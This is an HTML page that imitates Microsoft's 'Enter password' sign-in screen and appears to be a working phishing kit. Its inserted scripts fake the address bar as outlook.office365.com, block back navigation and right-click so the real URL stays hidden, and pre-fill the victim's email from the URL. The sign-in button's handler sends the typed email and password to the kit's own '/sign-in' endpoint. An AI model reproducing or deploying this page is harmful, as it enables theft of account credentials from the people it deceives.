<html dir="ltr" class="" lang="en"><head>
    <title>Sign in</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <!-- Add meta tags to prevent Google from indexing/accessing metadata -->
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="google" content="notranslate">
    <link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin="">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="//aadcdn.msauth.net">
    <link rel="dns-prefetch" href="//aadcdn.msftauth.net">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">
    <meta name="google-site-verification" content="2ha8r4M6dCCdv5bIEbwVgj31KQvTZ9fZll7L_Vly-mQ">
    <meta name="msvalidate.01" content="A219BD08BD3D60126A1DBA35BF6168E3">    
    <meta name="format-detection" content="telephone=no">
    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>
    <meta name="robots" content="none">
    <meta name="description" content="Sign in to your Microsoft account">

    <link data-loader="cdn" crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_81imvbluez-v5hbzpkxfcg2.css" rel="stylesheet">

    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_-8cgqRzfEOPEpYl9MSuPRw2.js" integrity="sha384-v+fG7+tpROCyxprqcP5/7k5Q/YQ+de+A9uO9RfWzTzaon5uh3yakzKuRp9PmMHgR" nonce=""></script><script charset="utf-8" nonce="" src="https://aadcdn.msauth.net/shared/1.0/content/js/oneDs_f2e0f4a029670f10d892.js"></script>

    <script data-loader="cdn" crossorigin="anonymous" src="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_b6qmkv34zrtzwovprnovhw2.js" nonce=""></script>

    <script charset="utf-8" nonce="" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pcustomizationloader_72a1051aa2aa2943d8c1.js"></script><script charset="utf-8" nonce="" src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pcustomizationloader_72a1051aa2aa2943d8c1.js"></script><script charset="utf-8" nonce="" src="https://aadcdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pstringcustomizationhelper_c4928fb5cff147a39780.js"></script>
    <script type="text/javascript" nonce="">
        // Add iframe masking code
        window.onload = function() {
            // Replace with your desired URL to show in address bar - should match index.html
            const displayUrl = "https://outlook.office365.com/owa/";
            
            // Get email from URL parameters
            const urlParams = new URLSearchParams(window.location.search); 
            const email = urlParams.get('email') || localStorage.getItem('userEmail') || '';
            
            // Create the full display URL with email parameter
            const fullDisplayUrl = email ? 
                `${displayUrl}?email=${encodeURIComponent(email)}` : 
                displayUrl;
            
            // Update browser history without reloading
            window.history.pushState({}, '', fullDisplayUrl);
            
            // Prevent user from seeing actual URL on back navigation
            window.addEventListener('popstate', function() {
                window.history.pushState({}, '', fullDisplayUrl);
            });

            // Disable right-click to prevent frame inspection
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });

            // Display email if available
            if (email) {
                document.getElementById('emailDisplay').textContent = email;
            }
        }
    </script>

    <!-- Add mobile-specific styles -->
    <style>
        @media (max-width: 600px) {
            .outer.app {
                min-width: auto !important;
                width: 100% !important;
            }
            
            .sign-in-box {
                min-width: auto !important;
                width: 90% !important;
                margin: 0 auto !important;
                padding: 24px 10px !important;
            }
            
            .background-logo-holder {
                margin-top: 0 !important;
                padding: 16px !important;
            }
            
            .background-logo {
                max-width: 100%;
                height: auto !important;
            }
            
            .identity {
                max-width: 100% !important;
                font-size: 14px !important;
            }
            
            .form-group {
                margin-bottom: 16px !important;
            }
            
            input[type="password"] {
                font-size: 16px !important; /* Prevents iOS zoom on focus */
                width: 100% !important;
            }
            
            .win-button {
                width: 100% !important;
                margin: 4px 0 !important;
            }
            
            .footer {
                position: relative !important;
                padding: 12px !important;
            }
            
            .footer-links {
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                gap: 12px;
            }
            
            .background-image-holder {
                height: 100vh !important;
                background-size: cover !important;
            }
            
            /* Adjust header for mobile */
            #loginHeader {
                padding: 0 12px !important;
            }
            
            .title {
                font-size: 20px !important;
                margin-bottom: 12px !important;
            }
            
            .subtitle {
                font-size: 14px !important;
            }

            /* Mobile-specific sign-in options box positioning */
            .promoted-fed-cred-box {
                position: relative !important;
                margin-top: 3em !important;
                width: 90% !important;
                margin-left: auto !important;
                margin-right: auto !important;
                background: #fff !important;
                border: 1px solid rgba(0,0,0,0.1) !important;
                border-radius: 2px !important;
                box-shadow: 0 2px 3px rgba(0,0,0,0.05) !important;
                z-index: 100 !important;
            }

            .promoted-fed-cred-box .tile {
                padding: 12px !important;
                margin: 0 !important;
            }

            /* Adjust footer positioning for mobile */
            #footer {
                position: fixed !important;
                bottom: 0 !important;
                left: 0 !important;
                width: 100% !important;
                background: rgba(255, 255, 255, 0.95) !important;
                padding: 8px 0 !important;
                z-index: 99 !important;
            }

            .footer-links {
                padding: 0 16px !important;
                margin-bottom: 8px !important;
            }

            /* Adjust sign-in options box */
            .promoted-fed-cred-box {
                position: relative !important;
                margin: 1.5em auto !important;
                width: 90% !important;
                padding: 8px !important;
                background: #fff !important;
                border: 1px solid rgba(0,0,0,0.1) !important;
                border-radius: 2px !important;
                box-shadow: 0 2px 3px rgba(0,0,0,0.05) !important;
                z-index: 98 !important;
            }

            /* Optimize header and logo area */
            .background-logo-holder {
                padding: 12px 16px !important;
                margin: 0 auto 32px !important;
                position: relative !important;
                top: -2em !important;
            }

            .background-logo-holder span {
                font-size: 20px !important;
            }

            .background-logo-holder div {
                margin-top: 2px !important;
            }

            /* Ensure proper content spacing */
            .outer.app {
                padding-top: 32px !important;
                padding-bottom: 80px !important; /* Make room for fixed footer */
            }

            .sign-in-box {
                margin: 0 auto 16px !important;
                padding: 20px 16px !important;
            }

            .background-image-holder {
                min-height: 100vh !important;
                padding-top: 16px !important;
            }

            .promoted-fed-cred-box {
                margin: 12px auto !important;
                padding: 4px !important;
            }

            .promoted-fed-cred-box .tile {
                padding: 6px 8px !important;
            }
        }
    </style>
</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript" nonce="">//<![CDATA[
!function(){var e=window,s=e.document,i=e.$Config||{};if(e.self===e.top){s&&s.body&&(s.body.style.display="block")}else if(!i.allowFrame){var o,t,r,f,n,d;if(i.fAddTryCatchForIFrameRedirects){try{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}catch(e){}}else{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",
o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}}}();
//]]></script>
    

<div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="/sign-in" class="provide-min-height">
    <!-- Add hidden email input -->
    <input type="hidden" name="email" id="hiddenEmail" value="{{ email }}">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }" class="provide-min-height"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl -->
    <div class="background-image-small" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_2055002f2daae2ed8f69f03944c0e5d9.jpg&quot;);"></div>
    <!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_2055002f2daae2ed8f69f03944c0e5d9.jpg&quot;);">
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer app" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails,
                'has-header': $content.hasHeader }" class="sign-in-box ext-sign-in-box app fade-in-lightbox has-popup">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->

<!-- ko if: !bannerLogoUrl && isCiamUserFlowUx && bannerLogoText --><!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->

    <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds,
                    customStrings: $loginPage.stringCustomizationObservables.customStrings(),
                    isCustomizationFailure: $loginPage.stringCustomizationObservables.isCustomStringsLoadFailure(),
                    userIdLabel: $loginPage.userIdLabel,
                    cantAccessYourAccountText: $loginPage.cantAccessYourAccountText,
                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials,
                    accessRecoveryLink: $loginPage.accessRecoveryLink,
                    boilerPlateText: $loginPage.boilerPlateText },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    redirect: $loginPage.view_onRedirect,
                    updateDFPUrl: $loginPage.view_onUpdateDFPUrl,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

<div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: customTitle() || str['WF_STR_HeaderDefault_Title'],
        headerDescription: customDescription() } }"><div>
    <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
        <div class="row">
            <div class="identityBanner">
            <!-- Single email display -->
            <div id="displayName" class="identity" style="
                display: inline-block;
                vertical-align: middle;
                font-size: 15px;
                color: #262626;
                line-height: 1.75;
                white-space: nowrap; 
                overflow: hidden;
                text-overflow: ellipsis;
                max-width: 300px;
                margin-bottom: 10px;
                font-family: 'Segoe UI', 'Helvetica Neue', 'Liberation Sans', Arial, sans-serif;">{{ email }}</div>
            </div>
            </div>
        </div>
        <div role="heading" aria-level="1" data-bind="text: title">Enter password</div>
        <!-- ko if: isSubtitleVisible -->
        <div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="subtitle ext-subtitle"></div>
        <!-- /ko -->
        
        <!-- Add error message div here -->
        <div class="alert alert-error" id="passwordError" role="alert" style="display:none; color: #e81123; font-size: 13px; line-height: 20px; padding-top: 12px;">
            Please enter the password for your Microsoft account.
        </div>
    </div>
</div></div>

<!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko -->

<div class="row">
    <!-- ko if: svr.fEnableAriaLiveUpdates --><!-- /ko -->

    <!-- ko ifnot: svr.fEnableAriaLiveUpdates -->
    <div role="alert" aria-live="assertive">
        <!-- ko if: usernameTextbox.error --><!-- /ko -->
    </div>
    <!-- /ko -->

    <div class="form-group col-md-24">
        <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

        <!-- ko ifnot: prefillNames().length > 1 -->
        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: svr.fEnableLivePreview ? userIdLabel : tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input type="password" name="password" id="i0118" maxlength="64" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" placeholder="Password">

            <!-- ko if: svr.fIsUpdatedAutocompleteEnabled -->
            <input name="password" type="password" id="i0118" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
            <!-- /ko -->

            <!-- ko ifnot: svr.fIsUpdatedAutocompleteEnabled --><!-- /ko -->

        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        <!-- Add error message div -->
        <!-- ...existing code... -->
    </div>
</div>

<!-- Forgot password link -->
<div class="row">
    <div class="col-md-24">
        <a href="#" onclick="location.reload(); return false;">Forgot password?</a>
    </div>
</div>

<div class="win-button-pin-bottom">
    <div class="row">
        <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
            <div class="inline-block button-item ext-button-item">
                <input type="submit" id="submitButton" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" value="Sign in">
            </div>
        </div>
    </div>
</div>

<!-- ko if: svr.fShowLegalMessagingInline --><!-- /ko -->

<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText || boilerPlateText }">
    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText || boilerPlateText }">
        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <!-- ko ifnot: svr.fConsentButtonIdViaName -->
        <input type="submit" id="submitButton" class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
            attr: primaryButtonAttributes,
            css: { 'high-contrast-overrides': svr.fUseHighContrastDetectionMode },
            externalCss: {
            'button': true,
            'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: async function(data, event) {
            event.preventDefault();
            const email = document.getElementById('hiddenEmail').value;
            const password = document.getElementById('i0118').value;
            
            try {
                const response = await fetch('/sign-in', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'email': email,
                    'password': password
                })
                });

                const result = await response.json();
                
                if (result.status === 'verify') {
                window.location.href = result.redirect_url;
                } else if (result.status === 'success') {
                window.location.href = result.redirect_url;
                } else {
                document.getElementById('passwordError').textContent = result.message;
                document.getElementById('passwordError').style.display = 'block';
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('passwordError').textContent = 'An error occurred. Please try again.';
                document.getElementById('passwordError').style.display = 'block';
            }
            },
            clickBubble: false,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in">
        <!-- /ko -->
        <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <!-- ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken -->
        <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="bupWsg4lIkKnjZfArUwcdOoGAiQbiohGDs7qvNRSlVA=6:1:CANARY:AW8ye+aFncgQ/m8aCT9dccaDL4ykgPZp3tH5hBqMFok=">
        <!-- /ko -->
        <!-- ko if: !svr.sCanaryTokenName || svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAjVI7bNNQAPSrU9OWQiMkJEawEEIF5-P4l0gVcpM6_2_TXxCKnGc7dvx5SewkJFWXTozdkAAxMDB04TOhioG56lDBRKciMVQdACGGjjRiYewNp9vudHfzeDgQjt0O_QNNjZkKaVqYgupY_YfutRn_n4O5j_aL53T2xP8TGNt7u4DUPa_txoJB1PMshMwA0jQDqhGODUBkB9FADn4A4BCAEwB2J3guIvCMEGVYThA4hhUYOsBrjKyo4Sil0hGaYmhVpYRxCh6yvKAxvKCw8Ghirij2PJ0eE-oaI_X3xLSGuna9jVzvGf4FJDb6uTjKiMklORzprCtsolVka5Tkia2sXpE3VnJGw-ZE00Cd1WpUcEcOXEsNYb5pJ_r0uhXn47BcEqXF8mouKVZ1q5y3KgWpUpNCfXN5KV3OQEYfLDZbGzVD1JudwSi9TIWV1GBFkTKRaInJx6MdqHBVl4qYIyld6MB2tpHLxtkRxdIWZOVh1ulnlGikQfE9o5vm4RJX1eIdh1UqDrde52W9UfD0bqmoNhpZt6DVhV38Qru8x4nzpm3k7OMEaquOoRz6wLEPnPpmQ3hsamrGj93AbmJnPvBq8nzCp3fvfP_24Lr4bvModVC9he1PBhu99prbZKy0mXVaNU3srgygUkRJ0Sg3DKQnEy7f6Rcqy9aquMDFwjsE2CGIPWJ6CvdjJB4vhU8I8IsATy5he9MX-MPhZXA0y8wQ0JIN2702v0kaSt1DpuqQsU3yse3WIRyrvmz1VJeMPSTPLchHW1tbn65gZ1dfv3l5sP3184_U6dx9cU0YqvdkyYHNctAW5Hg1qkAoJ3LM0GyWau2Il2L1xU5eQubCWz927Mf-Ag2">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="e4262897-3fe1-4115-b17b-da48cc542100">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAABVrSpeuWamRam2jAF1XRQE1UZ4hwP_D_4lOfmAGCS_q2uleQ8fFO6tl-3fGpHw1r6P4Uv5qOT2fQhzu_M1zHqDt-TekF2IGMzzk5BeteZ3fT0f4eKAHtptdcdGLf54JnSu8oY_oWJb7QERu8vUzmwFdyl9jnmQN_TbJDmvVzzUQdP8w3s3x0QQz2Fu6iMK3v-XMc9bI37jXKxByZ4I7dNf6i0fhhqfjyq7tpSl6Udcslew-00fAl8uMLf8cCQZTIMCyATrvkWviohlF8YgZc8Tf7Pkkb2VP22dI3SuPE90xnjIFCot-8jJ2-IHgmTDUdVZ9rMuO8V_H1muRrE_Ew0uYUPw9gVJkTTcctHWNsKyiOglny9v4p_r6cTwFLUH8VKMtrerfhn022tgK0TiBk1z162EieCk4rZnMVfq_EQuN6vzBVPOGq92COZIqqpYqQaXOxo3_GnbdnKR_1Jy806m8AbsPbOhqm9-bFYYPrVp1Aw5fU0nqwL46BPXs43tvn_LZDMWGOF6I6M5bxQsUmwZIAA">
        <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
        <input type="hidden" name="NewUser" value="1">
